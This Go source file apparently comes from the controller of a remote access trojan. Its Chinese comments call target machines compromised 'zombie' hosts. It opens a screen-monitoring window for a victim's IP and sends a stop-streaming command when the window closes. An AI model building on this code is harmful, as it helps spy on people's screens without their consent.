package main

import (
	"github.com/lxn/walk"
	. "github.com/lxn/walk/declarative"
)

var (
	screenMW        *walk.MainWindow
	IMGscreen       *walk.ImageView
	bitmap          *walk.Bitmap
	screenMachineid = ""    //当前是否有肉鸡连接视频中，有的话值为肉鸡唯一识别码
	screenLock      = false //单例锁
)

func onScreen(ip string) {
	if screenLock == true { //判断单例
		return
	}
	defer func() {
		//告诉肉鸡关闭视频
		message := NewMessage(screenMachineid)
		message.Name = OFF_SCREEN //关闭监控
		msgs <- message           //发送消息

		screenMachineid = "" //解除占用
		if bitmap != nil {   //释放资源
			bitmap.Dispose()
		}
		if IMGscreen != nil { //删除画布
			IMGscreen.Dispose()
		}
		screenLock = false //解除单例锁
	}()
	screenLock = true
	_, _ = MainWindow{
		AssignTo: &screenMW,
		Title:    "屏幕监控" + ip,
		Size:     Size{400, 600},
		Layout:   Grid{Columns: 2},
		Children: []Widget{
			ImageView{
				AssignTo: &IMGscreen,
				Mode:     ImageViewModeStretch,
				//OnMouseDown: func(x, y int, button walk.MouseButton) {
				//	bitmap, _ := walk.NewBitmapFromImage(imgg)
				//	screen.SetImage(bitmap)
				//},
			},
		},
	}.Run()

}
